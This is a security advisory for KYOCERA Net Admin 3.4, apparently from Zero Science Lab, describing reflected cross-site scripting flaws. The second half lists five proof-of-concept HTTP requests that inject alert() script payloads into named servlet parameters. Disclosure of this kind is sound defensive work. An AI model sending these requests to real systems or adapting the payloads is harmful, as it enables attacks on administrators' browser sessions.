@@ -1,0 +1,56 @@
+
+KYOCERA Net Admin 3.4 Multiple XSS Vulnerabilities
+
+
+Vendor: KYOCERA Corporation
+Product https://global.kyocera.com
+Affected version: 3.4.0906
+
+Summary: KYOCERA Net Admin is Kyocera's unified
+device management software that uses a web-based
+platform to give network administrators easy and
+uncomplicated control to handle a fleet for up to
+10,000 devices. Tasks that used to require multiple
+programs or walking to each printer can now be
+accomplished in a single, fast and modern environment.
+
+Desc: The application is prone to multiple reflected
+cross-site scripting vulnerabilities due to a failure to
+properly sanitize user-supplied input to several parameters
+that are handled by various servlets. Attackers can
+exploit this issue to execute arbitrary HTML and script
+code in a user's browser session.
+
+Tested on: Microsoft Windows 7 Professional SP1 (EN)
+           Apache Tomcat/8.5.15
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2018-5457
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5457.php
+
+
+28.03.2018
+
+--
+
+
+====
+POST /fwk-web/jsp/addUser.faces HTTP/1.1
+
+addUserForm:loginName=&addUserForm:pw=&addUserForm:pwConfirm=&addUserForm:required_name=test&addUserForm:required_email1=oo@oo.o&addUserForm:required_role=</script><script>alert(1)</script>&addUserForm:optional_name=test&addUserForm:company=&addUserForm:department=&addUserForm:email2=&addUserForm:optional_phone=&addUserForm:optional_cell=&addUserForm:submitHidden=true&add
+
+===
+GET /fwk-web/jsp/jobview/container.faces?refresh=yes";alert(2)//
+
+===
+GET /npdm-web/jsp/rightHeader.faces?MAPVIEW_ZOOM_ENA=50&rightForm_SUBMIT=1&rightForm:reloadMapHidden=false&rightForm:zoomHidden=100&rightForm:displayHidden=listviewPane.faces';alert(3)//
+
+===
+GET /fwk-web/servlet/EventControllerServlet?bname=&ts=1522690268877&cmd=tv_set_cur_node&node_id=root.user_administration.administrator.admin<a xmlns:a='http://www.w3.org/1999/xhtml'><a:body onload='alert(4)'/></a>
+
+===
+GET /npdm-web/servlet/EventControllerServlet?bname=treeBackingBean&ts=1522690222545&cmd=tv_set_cur_node&node_id=KMNETADMIN.ALLDEVICES<a xmlns:a='http://www.w3.org/1999/xhtml'><a:body onload='alert(5)'/></a>&expand=true
